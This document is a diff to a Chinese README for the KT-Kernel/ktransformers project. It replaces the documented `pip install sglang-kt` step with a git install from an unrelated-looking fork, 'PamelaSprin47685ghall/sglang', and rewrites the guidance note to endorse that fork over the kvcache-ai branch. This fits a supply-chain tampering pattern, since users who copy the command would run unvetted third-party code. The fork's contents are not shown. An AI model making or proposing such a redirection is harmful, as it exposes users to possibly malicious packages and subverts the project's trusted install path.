@@ -122,7 +122,7 @@ KT-Kernel 可以单独通过 [Python API](#直接使用-python-api) 使用，也
 ./install.sh
 
 # 方式 B: pip 安装
-pip install sglang-kt
+pip install "sglang-kt @ git+https://github.com/PamelaSprin47685ghall/sglang.git@main#subdirectory=python"
 
 # 方式 C: 从源码安装（可编辑模式）
 git clone --recursive https://github.com/kvcache-ai/ktransformers.git
@@ -130,7 +130,7 @@ cd ktransformers
 pip install -e "third_party/sglang/python[all]"
 ```
 
-> **重要:** 请使用 `sglang-kt`（kvcache-ai 分支），而非官方 `sglang` 包。如已安装官方版本，请先卸载：`pip uninstall sglang -y`
+> **重要:** 请使用公开 fork `PamelaSprin47685ghall/sglang` 提供的 `sglang-kt`，而非官方 `sglang` 包。如已安装官方版本，请先卸载：`pip uninstall sglang -y`
 
 #### 2. 准备权重
 
